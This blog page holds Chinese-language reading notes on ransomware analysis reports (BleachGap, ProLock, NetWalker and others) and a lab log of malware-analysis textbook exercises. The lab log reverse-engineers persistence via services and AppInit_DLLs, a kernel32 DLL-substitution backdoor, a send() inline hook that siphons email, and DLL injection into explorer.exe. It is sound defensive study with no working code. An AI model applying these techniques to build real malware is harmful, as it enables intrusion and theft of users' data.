<p>每个赎金票据的底部还有一个加密的blob，其中包含受害者特定的系统数据以及已编码的RSA公钥。</p>
<p><a target="_blank" rel="noopener" href="https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone/">Egregor勒索软件简要分析报告</a></p>
<h2 id="BleachGap"><a href="#BleachGap" class="headerlink" title="BleachGap"></a>BleachGap</h2><p>2021.02</p>
<p>具备添加自启动、添加计划任务、改写MBR、使键盘按键失效、通过可移动介质传播等多项功能</p>
<p>采用AES-256对称加密算法加密文件</p>
<p>攻击流程如下所示</p>
<img src="/2021/03/16/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20210321171900462.png" alt="image-20210321171900462" style="zoom:67%;">

<p>bat行为</p>
<ul>
<li>删除系统卷影，防止恢复加密文件</li>
<li>修改注册表，绕过UAC机制，关闭安全警告</li>
<li>互换鼠标左右键，键盘按键失效</li>
<li>结束浏览器进程，结束任务管理器，创建计划任务，实现登陆时运行</li>
<li>调用aescrypt.exe，加密部分文件</li>
<li>生成勒索信</li>
<li>调用DiscordSendWebhook.exe，将用户名、加密密钥、个人ID等信息发送到攻击者创建的Discord频道</li>
<li>下载恶意代码，创建计划任务，每五天运行一次，会改写MBR，在开机时锁定计算机</li>
<li>在每个磁盘根目录下创建autorun.inf文件，而且可以感染U盘，即使重装系统后，再打开其他硬盘又会激活病毒</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P-mDJtc8rhveY9yMQyloHA"><strong>安天智甲有效防护 BleachGap 勒索软件</strong></a></p>
<h2 id="ProLock"><a href="#ProLock" class="headerlink" title="ProLock"></a>ProLock</h2><p>2020.04</p>
<p>将恶意shellcode嵌入到名为“WinMgr.bmp”的BMP图像文件中，通过混淆的PowerShell代码将图像中的代码注入到内存中运行。勒索软件执行后，加密计算机上的文件。</p>
<p>推测为PwndLocker勒索软件变种</p>
<img src="/2021/03/16/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20210321171836749.png" alt="image-20210321171836749" style="zoom:67%;">

<p>共包含4个文件</p>
<ul>
<li>run.bat</li>
<li>clean.bat</li>
<li>WinMgr.xml</li>
<li>WinMgr.bmp</li>
</ul>
<p>行为</p>
<ul>
<li>从run.bat脚本文件启动，创建Windows任务并用WinMgr.xml进行配置</li>
<li>执行clean.bat脚本，然后执行Base64编码的Powshell脚本，从WinMgr.bmp中提取出可执行文件并加载到内存中</li>
<li>为了顺利加密文件，调用cmd执行命令停止大量服务</li>
<li>使用“AES+RSA”加密算法加密文件，删除卷影副本防止恢复加密文件</li>
<li>加密计算机文件后会在原文件名后追加“.proLock”后缀</li>
<li>生成勒索信</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://news.sophos.com/en-us/2020/07/27/prolock-ransomware-gives-you-the-first-8-kilobytes-of-decryption-for-free/">ProLock ransomware gives you the first 8 kilobytes of decryption for free</a></p>
<h2 id="NetWalker"><a href="#NetWalker" class="headerlink" title="NetWalker"></a>NetWalker</h2><p>2019</p>
<p>攻击者不断研究复杂的方式逃避检测，其中一种攻击方式是利用了反射动态链接库（DLL）注入的技术，也称reflective DLL加载</p>
<p>脚本行为分析</p>
<ul>
<li>脚本进行了多层加密、混淆、编码<ul>
<li>最顶层为base64编码</li>
<li>下一层是十六进制编码XOR加密</li>
<li>解密后仍有一定程度混淆</li>
</ul>
</li>
<li>勒索软件以十六进制嵌入脚本，脚本会将其解码产生两个DLL，根据环境判断使用的DLL脚本</li>
<li>将恶意DLL以反射方式注入到进程explorer.exe中</li>
</ul>
<p>软件分析</p>
<ul>
<li>使用6个随机字符作为扩展名重命名加密文件</li>
<li>添加注册表项</li>
<li>终止某些进程与服务（比如数据备份、安全等相关的进程）</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.trendmicro.com/en_us/research/20/e/netwalker-fileless-ransomware-injected-via-reflective-loading.html">Reflective Loading Runs Netwalker Fileless Ransomware</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/" itemprop="url">恶意代码分析实战lab记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-14T12:40:43+08:00">
                2021-03-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="ch7"><a href="#ch7" class="headerlink" title="ch7"></a>ch7</h2><h3 id="7-1"><a href="#7-1" class="headerlink" title="7-1"></a>7-1</h3><p>自启动服务</p>
<p>使用IDA查看main函数</p>
<ul>
<li>将<code>ServiceStartTable.lpServiceName</code>赋值为“MalService”</li>
<li>将<code>ServiceStartTable.lpServiceProc</code>赋值为sub_401040</li>
<li>调用<code>StartServiceCtrlDispatcherA</code></li>
</ul>
<img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314130502920.png" alt="image-20210314130502920" style="zoom:67%;">

<p>查询SERVICE_TABLE_ENTRYA结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">The SERVICE_TABLE_ENTRY structure is used by the StartServiceCtrlDispatcher function to specify the ServiceMain function for a service that can run in the calling process.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">lpServiceName:Pointer to a null-terminated string that specifies the name of a service to be run in this service process. </span></span><br><span class="line"><span class="comment">lpServiceProc:Pointer to a ServiceMain function. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SERVICE_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">  LPTSTR lpServiceName;</span><br><span class="line">  LPSERVICE_MAIN_FUNCTION lpServiceProc;</span><br><span class="line">&#125; SERVICE_TABLE_ENTRY, *LPSERVICE_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>综上，可以知道主函数会将从地址sub_401040开始运行名为MalService的服务，进一步分析sub_401040</p>
<img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314131829082.png" alt="image-20210314131829082" style="zoom:67%;">

<ul>
<li><p>检测互斥量HGL345(变量Name的值)是否存在，如果不存在则创建该互斥量，如果存在则结束程序，因为这说明已经存在一个恶意程序了</p>
</li>
<li><p>调用<code>OpenSCManagerA</code>函数，打开一个服务控制管理器的句柄，以便这个程序可以添加或者修改服务</p>
</li>
<li><p>调用<code>GetCurrentProcess</code>函数，获取当前进程句柄</p>
</li>
<li><p>调用<code>GetModuleFileNameA</code>函数，获取当前进程的完整路径名到变量Filename</p>
</li>
<li><p>调用<code>CreateServiceA</code>函数，定义如下，对照调用的参数可知作用是创建了名为“Malware”的服务，对应的可执行文件位置为Filename，dwServiceType为0x10表示在自己的进程中运行的服务，dwStartType为0x2表示该程序会自启动，说明这一服务会在系统开机时运行</p>
<p>可参考<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea">CreateServiceA function</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SC_HANDLE <span class="title">CreateServiceA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE hSCManager,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpServiceName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpDisplayName,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwServiceType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwStartType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwErrorControl,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpBinaryPathName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpLoadOrderGroup,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD   lpdwTagId,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpDependencies,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpServiceStartName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpPassword</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>设定时间变量SystemTime，具体为2100年1月1日0时0分</p>
</li>
<li><p>调用<code>systemtimetofiletime</code>将设定的时间转换为文件格式时间变量FileTime</p>
</li>
<li><p>调用<code>CreateWaitableTimer</code>函数创建无界面定时器，句柄为v1，调用<code>SetWaitableTimer</code>设置该定时器时间为到FileTime为止</p>
</li>
<li><p>调用<code>waitforsingleobject</code>等待定时器到时或超出时间间隔，如果没到时则Sleep后退出</p>
</li>
<li><p>到时后，调用20次<code>CreateThread</code>函数创建多个起始地址为StartAddress的线程</p>
</li>
</ul>
<p>进一步分析StartAddress</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314140317244.png" alt="image-20210314140317244"></p>
<ul>
<li>无出口循环结构，最初会调用<code>InternetOpen</code>函数设置用户代理为“Internet Explorer 8.0”</li>
<li>反复调用<code>InternetOpenUrl</code>函数，功能是反复打开url为<code>http://www.malwareanalysisbook.com</code>的网址</li>
</ul>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ul>
<li><p>当计算机重启之后，这个程序如何保证它继续运行（达到持久化驻留）？</p>
<p>该程序在通过创建服务时设置参数将该服务设置为自启动，保证其开机时自动运行</p>
</li>
<li><p>为什么这个程序会使用一个互斥量？</p>
<p>保证系统中同时只有一个实例运行</p>
</li>
<li><p>可以用来检测这个程序的基于主机特征是什么？</p>
<p>互斥量HGL345，服务MalService</p>
</li>
<li><p>检测这个恶意代码的基于网络特征是什么？</p>
<p>使用“Internet Explorer 8.0”用户代理访问<code>http://www.malwareanalysisbook.com</code></p>
</li>
<li><p>这个程序的目的是什么？</p>
<p>潜伏到2100年1月1日对<code>http://www.malwareanalysisbook.com</code>发起DDOS攻击</p>
</li>
<li><p>这个程序什么时候完成执行？</p>
<p>不会停止执行</p>
</li>
</ul>
<h3 id="7-2"><a href="#7-2" class="headerlink" title="7-2"></a>7-2</h3><p>组件对象模型COM库</p>
<p>使用IDA查看主函数</p>
<img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314200525735.png" alt="image-20210314200525735" style="zoom:67%;">

<ul>
<li><p>调用<code>OleInitialize</code>函数初始化COM（组件对象模型）库</p>
</li>
<li><p>调用<code>CoCreateInstance</code>来获取对COM功能的访问，将该COM对象标记为ppv</p>
<p>可参考 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance">CoCreateInstance</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">CoCreateInstance</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  REFCLSID  rclsid,              <span class="comment">//待创建组件的CLSID</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPUNKNOWN pUnkOuter,           <span class="comment">//指向聚合组件，为空表示非聚合</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwClsContext,        <span class="comment">//管理创建对象的代码将在其中运行的上下文，表示类别</span></span></span></span><br><span class="line"><span class="function"><span class="params">  REFIID    riid,                <span class="comment">//创建的COM对象的接口标识符，用于通信</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID    *ppv                 <span class="comment">//用来接收指向Com对象接口地址的指针变量 </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>参数中rclsid为<code>0002DF01-0000-0000-C000-000000000046</code>，保存在<code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\</code></p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314202358889.png" alt="image-20210314202358889"></p>
<p>riid为<code>D30C1661-CDAF-11D0-8A3E-00C</code></p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314202434329.png" alt="image-20210314202434329"></p>
<p>打开注册表编辑器查询（实际上这两个是书上的例子）</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210314203631781.png" alt="image-20210314203631781"></p>
<p>可知其为IWebBrowser2接口</p>
<p>在结构视图添加对应标准结构</p>
</li>
</ul>
<h4 id="7-3"><a href="#7-3" class="headerlink" title="7-3"></a>7-3</h4><p>DLL替换    </p>
<p>用IDA打开exe文件，查看字符串，发现一些可疑的字符串</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210315185807410.png" alt="image-20210315185807410"></p>
<p>用IDA打开dll文件，查看字符串，发现一个IP</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210315212711194.png" alt="image-20210315212711194"></p>
<p>对dll文件主函数DLLMain进行分析</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210315221404174.png" alt="image-20210315221404174"></p>
<ul>
<li>首先创建或打开互斥量，名为“SADFHUHF”</li>
<li>调用WSAStartup进行库函数绑定。调用函数socket，参数（2,1,6）表示使用IPv4，TCP流。</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210315231751759.png" alt="image-20210315231751759"></p>
<ul>
<li>设置保留地址为127.26.152.13，调用<code>connect</code>函数进行连接</li>
<li>send操作，发送“hello”到接收方</li>
<li>recv操作，接收字节到buf字段，与“sleep”比较，如果是sleep，则休眠一段时间</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316094513218.png" alt="image-20210316094513218"></p>
<ul>
<li>将buf字段前4个字节与“exec”比较，如果是则调用<code>CreateProcess</code>创建进程，创建的命令语句为&amp;v11[4]，参考栈对应的结构，这里是指buf字段的第五个字节起的字符串。即执行接受到的命令，执行结束后会回到hello处</li>
<li>总结：实现与远程端交互功能的后门</li>
</ul>
<p>对exe文件主函数main进行分析</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316100032936.png" alt="image-20210316100032936"></p>
<ul>
<li>比较参数数量是否为2，以及第二个参数是否为一个警告字符串</li>
<li>调用<code>CreateFileA/CreateFileMappingA/MapViewOfFile</code>等将<code>C:\Windows\System32\Kernel32.dll</code>映射到内存</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316100406267.png" alt="image-20210316100406267"></p>
<ul>
<li><p>使用类似的操作将<code>Lab07-03.dll</code>映射到内存，推测该为后门dll</p>
</li>
<li><p>接下来是一段比较复杂的操作，其中有使用了了字符串”kerne132.dll”，推测是进行内存操作，创建用于混淆视听的内存映射<code>kerne132.dll</code></p>
</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316101332111.png" alt="image-20210316101332111"></p>
<ul>
<li>在最后处，关闭了两个文件映射的句柄，将<code>C:\Windows\System32\Kernel32.dll</code>文件内容复制到<code>C:\windows\system32\kerne132.dll</code>中</li>
<li>调用<code>sub_4011E0</code>函数，注意传入的参数lpFileName的值是C的盘符，进一步查看该函数内部</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316101846395.png" alt="image-20210316101846395"></p>
<ul>
<li><p>使用的<code>FindFirstFile/FindNextFile</code>等函数和循环结构会循环搜索C盘下的所有文件</p>
</li>
<li><p>在循环结构内部，对于找到的文件判断是否可进一步递归查找，如果可以则递归调用<code>sub_4011E0</code>函数，已达到搜索C盘下所有文件的目的</p>
</li>
<li><p>如果为文件，判断其是否是exe文件，如果是，调用函数<code>sub_4010A0</code>，该函数会打开这一文件进行文件操作，简单来说会找到该文件内<code>kernel32.dll</code>字符串所在的位置，并用<code>kerne132.dll</code>进行替换</p>
</li>
<li><p>总结：该exe文件将Lab07-03.dll文件复制为<code>C:\\windows\\system32\\kerne132.dll</code>，并会遍历C盘下所有加载了<code>kernel32.dll</code>的exe文件，将动态链接库修改为<code>kerne132.dll</code></p>
</li>
</ul>
<h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h4><ul>
<li><p>当计算机重启之后，这个程序如何保证它继续运行（达到持久化驻留）？</p>
<p>该程序将后门植入到恶意dll文件中，并修改了C盘下所有可执行文件的动态链接</p>
</li>
<li><p>可以用来检测这个程序的基于主机特征是什么？</p>
<p>互斥量<code>SADFHUHF</code>，dll文件<code>kerne132.dll</code></p>
</li>
<li><p>这个程序的目的是什么？</p>
<p>植入极难移除的后门程序，可由远程主机进行执行命令</p>
</li>
<li><p>安装后如何移除</p>
<p>可以以类似于该程序的方式修改盘符下所有可执行文件的动态链接库为<code>kernel32.dll</code>，再删除<code>kerne132.dll</code>即可</p>
</li>
</ul>
<h2 id="ch11"><a href="#ch11" class="headerlink" title="ch11"></a>ch11</h2><h3 id="11-1"><a href="#11-1" class="headerlink" title="11-1"></a>11-1</h3><h3 id="11-2"><a href="#11-2" class="headerlink" title="11-2"></a>11-2</h3><p>检查dll文件，发现一个导出函数installer</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316132518610.png" alt="image-20210316132518610"></p>
<p>查看dll文件导出函数<code>installer</code></p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316152737926.png" alt="image-20210316152737926"></p>
<ul>
<li>调用<code>RegOpenKeyEx</code>打开注册表<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code>，句柄保存到phkResult</li>
<li>调用<code>RegSetValueEx</code>，设置<code>AppInit_DLLs</code>表项值为<code>spoolvxx32.dll</code></li>
<li>调用<code>CopyFile</code>将自身dll复制到<code>system32\spoolvxx32.dll</code></li>
</ul>
<p>查看dll文件主函数<code>DllMain</code></p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316132617243.png" alt="image-20210316132617243"></p>
<ul>
<li>保存当前完整路径到hinstDLL</li>
<li>打开文件<code>system32\Lab11-02.ini</code></li>
<li>读取文件到<code>byte_100034A0</code>，调用<code>sub_100010B3</code>函数进行处理，推测该函数为一个解密函数</li>
<li>调用<code>sub_100014B6</code>函数，进入查看</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210316164014996.png" alt="image-20210316164014996"></p>
<ul>
<li>调用<code>sub_10001075</code>函数，将当前模块完整路径保存到Buf1</li>
<li>调用<code>sub_10001104</code>函数，返回最后一个<code>\</code>之后的字符串，即模块名，保存到Buf1</li>
<li>调用<code>sub_1000102D</code>函数，将Buf1所有小写字母变为大写</li>
<li>比较Buf1和“THEBAT.EXE”、“OUTLOOK.EXE”、“MSIMN.EXE”，有任一相同则判断成功</li>
<li>调用<code>sub_100013BD</code>函数，挂起除当前进程外所有线程</li>
<li>调用<code>sub_10001499</code>函数，恢复线程</li>
<li>调用<code>sub_100012A3</code>函数，四个参数分别是’wsock32.dll’、’send’、<code>sub_1000113D</code>、dword_10003484数据空间，进入详细查看</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321115649645.png" alt="image-20210321115649645"></p>
<ul>
<li>经过一系列操作获取<code>wsock32.dll</code>的句柄和其中<code>send</code>函数的地址，保存到result</li>
<li>调用<code>sub_10001203</code>函数函数，三个参数分别为<code>send</code>函数的地址，<code>sub_1000113D</code>、dword_10003484数据空间，进入详细查看</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321131033605.png" alt="image-20210321131033605"></p>
<ul>
<li>调用<code>VirtualProtect</code>函数改变send函数的保护方式，并保存旧的保护方式到<code>flOldProtect</code>，之后会再次调用<code>VirtualProtect</code>函数恢复保护方式</li>
<li>经过一系列内存操作，修改send函数内容，会在开头跳转到<code>sub_1000113D</code>，注意前5个字节被保留，因为需要正常的函数开头方便执行</li>
<li>最后会在dword_10003484</li>
<li>进入hook函数<code>sub_1000113D</code></li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321132039444.png" alt="image-20210321132039444"></p>
<ul>
<li>查找字符串中是否有’RCPT TO:’，如果存在，则创建一个’RCPT TO:’开头的字符串，后跟byte_100034A0，此时应该表示解密获得的邮箱地址，最后以‘&gt;\r\n’结束</li>
</ul>
<h4 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h4><ul>
<li><p>这个恶意DLL导出了什么？</p>
<p>一个名为<code>installer</code>的函数</p>
</li>
<li><p>使用run32dll.exe来安装这个恶意代码之后，发生了什么？</p>
<p>恶意代码会将<code>spoolvxx32.dll</code>复制到系统目录中<code>system32\</code>，然后打开并处理<code>Lab11-02.ini</code></p>
</li>
<li><p>为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？</p>
<p><code>system32\</code></p>
</li>
<li><p>这个安装的恶意代码如何驻留？</p>
<p>通过<code>installer</code>函数将<code>spoolvxx32.dll</code>安装到<code>AppInit_DLLS</code>表项</p>
</li>
<li><p>这个恶意代码采用的用户态Rootkit技术是什么？</p>
<p>针对<code>wsock32.dll</code>中的<code>send</code>函数安装了inline hook</p>
</li>
<li><p>挂钩代码做了什么？</p>
<p>检查对外的所有邮件，并发送到恶意邮箱</p>
</li>
<li><p>哪个或者哪些进程执行了这个恶意攻击，为什么？</p>
<p>MSIMN.exe、THEBAT.exe、OUTLOOK.exe</p>
</li>
<li><p>.ini文件的意义是什么？</p>
<p>保存了一个加密的恶意邮箱地址</p>
</li>
<li><p>你怎样用WireShark动态抓获这个恶意代码的行为？</p>
<p>查看这个恶意代码发送的邮件信息</p>
</li>
</ul>
<h2 id="ch12"><a href="#ch12" class="headerlink" title="ch12"></a>ch12</h2><h3 id="12-1"><a href="#12-1" class="headerlink" title="12-1"></a>12-1</h3><p>用IDA查看exe文件的main函数</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321160643586.png" alt="image-20210321160643586"></p>
<ul>
<li>三次动态载入<code>psapi.dll</code>，分别得到三个函数</li>
<li>调用<code>EnumProcess</code>函数枚举进程</li>
<li>对于每个进程，调用<code>sub_401000</code>函数，对比该进程是否是explorer.exe，如果是，则获取该进程句柄</li>
<li>调用<code>VirtualAllocEx</code>函数在该进程内分配一段空间，保存起始地址到<code>lpBaseAddress</code></li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321162537301.png" alt="image-20210321162537301"></p>
<ul>
<li>将<code>Lab12-01.dll</code>的路径写入该空间</li>
<li>获取<code>kernel32.dll.LoadLibraryA</code>的函数地址，并返回给<code>lpStartAddress</code></li>
<li>调用<code>CreateRemoteThread</code>函数创建远程线程，即用explorer.exe进程调用<code>kernel32.dll.LoadLibraryA</code>，参数为<code>Lab12-01.dll</code>的路径，从而实现dll注入</li>
</ul>
<p>用IDA查看dll文件</p>
<ul>
<li>其主函数只是执行了创建线程的命令，进入函数<code>sub_10001030</code>查看</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321163232518.png" alt="image-20210321163232518"></p>
<ul>
<li>该函数每隔一段时间会创建线程，进入<code>StartAddress</code>查看</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321163352810.png" alt="image-20210321163352810"></p>
<ul>
<li>可知这些线程会生成窗体</li>
</ul>
<h4 id="问题-3"><a href="#问题-3" class="headerlink" title="问题"></a>问题</h4><ul>
<li><p>运行可执行程序时会发生什么</p>
<p>每隔一段时间弹出窗口</p>
</li>
<li><p>哪个进程会被注入</p>
<p>explorer.exe</p>
</li>
<li><p>如何能让恶意代码停止弹出窗口</p>
<p>终止explorer.exe即可</p>
</li>
</ul>
<h4 id="12-2"><a href="#12-2" class="headerlink" title="12-2"></a>12-2</h4><p>查看主函数</p>
